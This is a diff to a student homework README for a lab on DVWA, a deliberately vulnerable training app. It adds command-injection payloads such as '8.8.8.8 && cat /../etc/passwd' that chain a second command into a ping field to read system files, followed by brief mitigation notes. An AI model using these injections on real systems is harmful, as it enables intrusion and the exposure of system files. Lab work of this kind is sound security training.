@@ -38,3 +38,30 @@
    - DVWA `8.8.8.8 && pwd`:
 
       ![DVWA ping & pwd](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20Ping%208.8.8.8.-pwd.PNG)
+
+
+4. Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:
+   
+    - DVWA `8.8.8.8 && cat /../etc/passwd`:
+      
+      [DVWA ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20ping-passwd.PNG)
+    
+    - Terminal `ping 8.8.8.8 && cat /../etc/passwd`:
+
+    [Terminal ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Terminal%20Ping-passwd.PNG)
+
+    - DVWA `8.8.8.8 && cat /../etc/hosts`:
+
+      [DVWA ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20ping-hosts.PNG)
+
+    - Terminal `ping 8.8.8.8 && cat /../etc/hosts`:
+
+      [Terminal ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Terminal%20ping-hosts.PNG)
+  
+
+5. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 
+
+  - Run with restricted permissions
+    - This will reduce the number of users that can access the database. It will also secure the location of all the confidential files and directories. 
+  - Don't use command line calls if possoble
+    - Use APIs whenever possible
